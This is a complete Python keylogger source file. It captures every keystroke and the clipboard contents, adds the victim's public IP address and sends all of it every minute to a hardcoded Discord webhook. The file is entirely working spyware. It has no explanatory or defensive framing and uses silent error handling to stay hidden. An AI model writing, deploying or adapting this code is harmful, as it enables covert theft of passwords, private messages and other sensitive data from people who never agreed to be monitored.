import time
import threading
import requests
import socket
import pyperclip
from pynput import keyboard

# Discord webhook URL
WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1151850027090718761/7i-9-fPmwoYz53yHGbhMW6LbEGhxXggtWP4r_ao0KC6pvOgpsYpxof8ofQNWzQJVWLZ_'

# Variables to store the logged characters
logged_characters = []

def get_current_time():
    return time.strftime("%H:%M:%S")

def get_public_ip_address():
    try:
        response = requests.get("https://ipinfo.io")
        data = response.json()
        return data.get("ip", "N/A")
    except Exception as e:
        pass

def send_to_discord_webhook(char_detected):
    global logged_characters

    # Check if there are characters to send
    if logged_characters:
        message = "```plaintext\n"
        message += "Char detected? " + ("YES" if char_detected else "NO") + "\n"
        message += "Public IP Address: " + get_public_ip_address() + "\n\n"
        message += '\n'.join(logged_characters)
        message += "\n```"

        payload = {
            'content': message
        }
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            logged_characters = []  # Clear the logged characters after sending

def keyPressed(key):
    current_time = get_current_time()
    try:
        char = key.char
        if char is not None:
            logged_characters.append(f"{current_time} - {char}")
    except AttributeError:
        special_keys = {
            keyboard.Key.ctrl: 'Ctrl',
            keyboard.Key.alt: 'Alt',
            keyboard.Key.caps_lock: 'Caps Lock',
            keyboard.Key.tab: 'Tab',
            keyboard.Key.backspace: 'Backspace',
            keyboard.Key.space: 'Space',
        }
        if key in special_keys:
            logged_characters.append(f"{current_time} - {special_keys[key]}")

def clipboard_handler():
    previous_clipboard_data = ""

    while True:
        current_clipboard_data = pyperclip.paste()

        if current_clipboard_data != previous_clipboard_data:
            # Clipboard data has changed (copy or paste)
            previous_clipboard_data = current_clipboard_data
            current_time = get_current_time()
            logged_characters.append(f"{current_time} - [Clipboard]\n{current_clipboard_data}")

        time.sleep(1)  # Check clipboard every 1 second

def start_keylogger():
    try:
        listener = keyboard.Listener(on_press=keyPressed)
        listener.start()
        listener.join()  # Keep the script running to capture key presses
    except Exception as e:
        pass

if __name__ == "__main__":
    try:
        # Create a daemon thread for the keylogger
        keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
        keylogger_thread.start()

        # Create a thread to monitor the clipboard
        clipboard_thread = threading.Thread(target=clipboard_handler, daemon=True)
        clipboard_thread.start()

        char_detected = False

        while True:
            # Check if characters have been detected in the current minute
            if logged_characters:
                char_detected = True
            else:
                char_detected = False

            send_to_discord_webhook(char_detected)
            time.sleep(60)  # Send characters, public IP, and char detection every minute

    except KeyboardInterrupt:
        pass
